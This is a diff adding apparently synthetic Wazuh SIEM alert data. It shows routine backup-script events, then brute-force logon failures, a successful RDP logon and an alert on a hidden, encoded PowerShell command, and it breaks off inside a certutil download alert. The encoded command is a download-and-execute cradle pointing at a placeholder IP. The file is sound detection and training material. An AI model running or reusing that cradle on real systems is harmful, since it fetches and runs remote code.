@@ -1,0 +1,1750 @@
+[
+  {
+    "timestamp": "2026-09-30T08:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726729.344939",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T09:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726730.960715",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T10:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726731.640717",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T11:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726732.233120",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T12:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726733.680112",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T13:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726734.67287",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T14:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726735.667269",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T15:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726736.864874",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T16:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726737.487819",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T17:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726738.954562",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T18:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726739.736132",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-09-30T19:05:00.000+0000",
+    "rule": {
+      "id": "100215",
+      "level": 3,
+      "description": "Sysmon - Process creation",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1
+    },
+    "agent": {
+      "id": "008",
+      "name": "dc-01",
+      "ip": "10.20.0.5"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726740.317869",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -File C:\\Scripts\\Backup-GPO.ps1",
+          "user": "CORP\\svc_backup"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:12:00.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726703.414741",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:12:09.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726704.15594",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:12:18.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726705.278304",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:12:27.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726706.563636",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:12:36.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726707.130592",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:12:45.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726708.477877",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:12:54.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726709.387490",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:13:03.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726710.706511",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:13:12.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726711.786395",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:13:21.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726712.706000",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:13:30.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726713.275896",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:13:39.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726714.613955",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:13:48.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726715.400534",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:13:57.000+0000",
+    "rule": {
+      "id": "60122",
+      "level": 5,
+      "description": "Logon Failure - Unknown user or bad password",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failed"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110.001"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726716.863367",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "workstationName": "-",
+          "status": "0xc000006d"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:14:06.000+0000",
+    "rule": {
+      "id": "60204",
+      "level": 10,
+      "description": "Multiple Windows Logon Failures",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_failures"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1110"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726717.670567",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4625",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:14:46.000+0000",
+    "rule": {
+      "id": "60106",
+      "level": 3,
+      "description": "Windows logon success",
+      "groups": [
+        "windows",
+        "windows_security",
+        "authentication_success"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1078"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726718.986967",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "4624",
+          "channel": "Security",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Security-Auditing"
+        },
+        "eventdata": {
+          "targetUserName": "j.doe",
+          "ipAddress": "203.0.113.77",
+          "logonType": "10",
+          "authenticationPackageName": "Negotiate"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:15:46.000+0000",
+    "rule": {
+      "id": "100210",
+      "level": 12,
+      "description": "Sysmon - PowerShell executed with an encoded command (hidden window)",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1059.001",
+          "T1027"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726719.390518",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGEALgBwAHMAMQAnACkA",
+          "parentImage": "C:\\Windows\\explorer.exe",
+          "user": "CORP\\j.doe",
+          "hashes": "SHA256=2B1F0C9A7E5D3B1A0F9E8D7C6B5A49382716051F4E3D2C1B0A99887766554433,MD5=1A2B3C4D5E6F708192A3B4C5D6E7F801"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-01T09:16:16.000+0000",
+    "rule": {
+      "id": "100211",
+      "level": 10,
+      "description": "Sysmon - certutil used to download a file",
+      "groups": [
+        "windows",
+        "sysmon",
+        "sysmon_event1",
+        "local"
+      ],
+      "firedtimes": 1,
+      "mitre": {
+        "id": [
+          "T1105"
+        ]
+      }
+    },
+    "agent": {
+      "id": "004",
+      "name": "ws-fin-07",
+      "ip": "10.30.7.57"
+    },
+    "manager": {
+      "name": "wazuh-manager"
+    },
+    "id": "1790726720.114609",
+    "decoder": {
+      "name": "windows_eventchannel"
+    },
+    "location": "EventChannel",
+    "data": {
+      "win": {
+        "system": {
+          "eventID": "1",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "computer": "ws-fin-07.corp.example",
+          "providerName": "Microsoft-Windows-Sysmon"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\certutil.exe",
